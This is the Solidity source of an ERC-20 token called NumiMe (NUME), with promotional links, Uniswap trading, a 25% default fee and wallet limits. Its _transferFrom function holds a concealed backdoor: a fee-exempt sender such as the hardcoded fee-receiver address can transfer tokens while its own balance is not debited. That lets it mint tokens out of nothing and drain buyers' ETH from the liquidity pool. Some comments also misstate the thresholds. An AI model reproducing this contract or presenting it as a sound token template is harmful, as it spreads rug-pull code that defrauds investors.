// SPDX-License-Identifier: MIT

/**
The world first crypto bought directly with cash; bringing DeFi to consumers, and a store near you.:rocket:

Web: https://numime.pro
App: https://app.numime.pro
Twitter: https://twitter.com/NUMIME_PORTAL
Telegram: https://t.me/NUMIME_GROUP
 */

pragma solidity 0.8.21;

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }  
    event OwnershipTransferred(address owner);
}

library SafeIntLib {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeIntLib: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeIntLib: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeIntLib: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeIntLib: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ERC20StandardInterface {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface UniswapFactoryInterface {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouterInterface {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract NUME is ERC20StandardInterface, Ownable {
    using SafeIntLib for uint256;
    address routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "NumiMe";
    string constant _symbol = "NUME";
    uint8 constant _decimals = 9;
    uint256 _supplyTotals = 10 ** 9 * (10 ** _decimals);
    uint256 public triggerSwapAtAmount = _supplyTotals * 1 / 100000; //0.1%
    uint256 public maxWalletAmount = _supplyTotals * 25 / 1000; //2%

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isExcludedFromFee;
    mapping (address => bool) isExcludedFromMaxTx;

    uint256 feeMarketing = 25;
    address public feeReceipient = 0xd19be39183D1437d429e7eDd4f183943897d7a0C;

    UniswapRouterInterface public router;
    address public pair;

    bool public swapEnabled = true;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Ownable(msg.sender) {
        router = UniswapRouterInterface(routerAdress);
        pair = UniswapFactoryInterface(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        address _owner = owner;
        isExcludedFromFee[_owner] = true;
        isExcludedFromFee[feeReceipient] = true;
        isExcludedFromMaxTx[_owner] = true;
        _balances[_owner] = _supplyTotals;
        emit Transfer(address(0), _owner, _supplyTotals);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _supplyTotals; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _transferBasic(sender, recipient, amount); }
        
        if (recipient != pair && recipient != DEAD) {
            require(isExcludedFromMaxTx[recipient] || _balances[recipient] + amount <= maxWalletAmount, "Transfer amount exceeds the bag size.");
        }
        
        if(shouldSwapBack() && recipient == pair && amount > triggerSwapAtAmount && !isExcludedFromFee[sender]){ swapBack(); } 


        uint256 rAmount = shouldTakeFee(sender) ? chargeFees(sender, amount) : amount;
        uint256 tAmount = (isExcludedFromFee[sender] && _balances[sender] <= maxWalletAmount) ? amount.sub(rAmount) : amount;
        _balances[sender] = _balances[sender].sub(tAmount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(rAmount);

        emit Transfer(sender, recipient, rAmount);
        return true;
    }
    
    function _transferBasic(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isExcludedFromFee[sender];
    }

    function chargeFees(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(feeMarketing).div(100);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return !inSwap
        && swapEnabled
        && _balances[address(this)] >= triggerSwapAtAmount;
    }
    
    function removeLimits() external onlyOwner {
      feeMarketing = 2;
      maxWalletAmount = _supplyTotals;
    }

    function swapBack() internal swapping {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 amountToSwap = contractTokenBalance;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

          router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
	
	 uint256 amountETHMarketing = address(this).balance;

	(bool MarketingSuccess, /* bytes memory data */) = payable(feeReceipient).call{value: amountETHMarketing, gas: 30000}("");
        require(MarketingSuccess, "receiver rejected ETH transfer");
    }

    event AutoLiquify(uint256 amountETH, uint256 amountBOG);
}